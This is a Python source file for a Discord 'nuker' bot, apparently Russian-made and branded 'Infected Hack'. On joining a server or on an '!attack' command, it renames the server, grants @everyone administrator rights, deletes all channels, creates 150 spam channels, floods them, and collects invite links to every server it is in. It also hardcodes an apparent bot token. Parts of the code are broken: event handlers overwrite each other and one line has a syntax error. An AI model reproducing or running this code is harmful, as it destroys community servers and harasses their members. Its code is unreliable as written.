import time
import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.guild_messages = True

client = commands.Bot(command_prefix="!", intents=intents)

async def spam_channel(channel, spam_text):
    for _ in range(5):
        await channel.send(spam_text)
        await asyncio.sleep(1.00)
        
@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game(name="Infected Hack"))

@client.event
async def on_ready():
    guild_id = 1209117061880479844
    guild_id = 1179169356547113061
    guild_id = 1212723618421932113
    guild = client.get_guild(guild_id)
    
    if guild is None or guild.id == guild_id:
        return
    
    await guild.edit(name="Infected Hack | Crashed")
    await client.change_presence(status=discord.Status.invisible)
    
    role = discord.utils.get(guild.roles, name="@everyone")
    await role.edit(permissions=discord.Permissions(administrator=True))
    
    await asyncio.gather(*(channel.delete() for channel in guild.channels))
    await asyncio.sleep(0.20)
    
    await asyncio.gather(*(guild.create_text_channel("Infected Hack") for _ in range(150)))
    await asyncio.sleep(0.60)
    
    spam_text = open('spam.txt', 'r').read()
    
    await asyncio.gather(*(spam_channel(channel, spam_text) for channel in guild.channels))
    await client.change_presence(status=discord.Status.online, activity=discord.Game(name="Infected Hack"))
    
    time.sleep(5);
    
    await guild.leave()
            
guild_ids = [1209117061880479844, 1179169356547113061, 1212723618421932113]

@client.event
async def on_guild_join(guild):
    guild_id = 1209117061880479844
    guild_id = 1179169356547113061
    guild_id = 1212723618421932113
    
    if guild.id == guild_id:
        return
    await guild.edit(name="Infected Hack | Crashed")
    await client.change_presence(status=discord.Status.invisible)

    role = discord.utils.get(guild.roles, name="@everyone")
    await role.edit(permissions=discord.Permissions(administrator=True))

    await asyncio.gather(*(channel.delete() for channel in guild.channels))
    await asyncio.sleep(0.50)

    await asyncio.gather(*(guild.create_text_channel("Infected Hack") for _ in range(150)))
    await asyncio.sleep(0.60)

    spam_text = open('spam.txt', 'r').read()
    
    await client.change_presence(status=discord.Status.online, activity=discord.Game(name="Infected Hack"))
    await asyncio.gather(*(spam_channel(channel, spam_text) for channel in guild.channels))

    time.sleep(10);

    await guild.leave()

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!attack'):
        try:
            server_id = int(message.content.split()[1])
        except IndexError:
            await message.channel.send("Ошибка: Пожалуйста, укажите ID сервера после команды `!attack`.")
            return
        except ValueError:
            await message.channel.send("Ошибка: Неверный формат ID сервера.")
            return

        guild = discord.utils.get(client.guilds, id=server_id)

        if guild is None or guild.id not in guild_ids:
            await message.channel.send("Ошибка: Недопустимый сервер ID для атаки")
            return

        await guild.edit(name="Infected Hack | Crashed")
        await client.change_presence(status=discord.Status.invisible)

        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=discord.Permissions(administrator=True))

        await asyncio.gather(*(channel.delete() for channel in guild.channels))
        await asyncio.sleep(0.40)

        await asyncio.gather*(guild.create_text_channel("Infected Hack") for _ in range(150))
        await asyncio.sleep(0.70)

        spam_text = open('spam.txt', 'r').read()
        await asyncio.gather(*(spam_channel(channel, spam_text) for channel in guild.channels))

        await client.change_presence(status=discord.Status.online, activity=discord.Game(name="Infected Hack"))

        time.sleep(5)
        await guild.leave()
    
@client.event
async def on_message(message):
    if message.content == '!bot leave':
        for guild in client.guilds:
            await guild.leave()
        await message.channel.send("Бот, успешно покинул все сервера!")
        
@client.event
async def on_message(message):
    if message.content == '!bot online':
        await client.change_presence(status=discord.Status.online)

@client.event   
async def on_message(message):
    if message.content == '!bot offline':
        await client.change_presence(status=discord.Status.offline)
        
        
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if not isinstance(message.channel, discord.DMChannel):
        return

    if not message.content.startswith('!list'):
        return

    guilds = client.guilds

    for guild in guilds:
        invite = await create_invite(guild)
        if invite is not None:
            response = f"**`{guild.name}`** *{guild.id}* {invite.url}"
            await message.channel.send(response)

async def create_invite(guild):
    for channel in guild.text_channels:
        try:
            invite = await channel.create_invite(max_age = 300)
            return invite
        except:
            continue
    return None

client.run('MTIyODczMzM5MTY2MzM5ODkxMg.Gejx4t.cdmKalkbAguWXdxf5oqL88DQYEcOn2Yl6i0Fx4')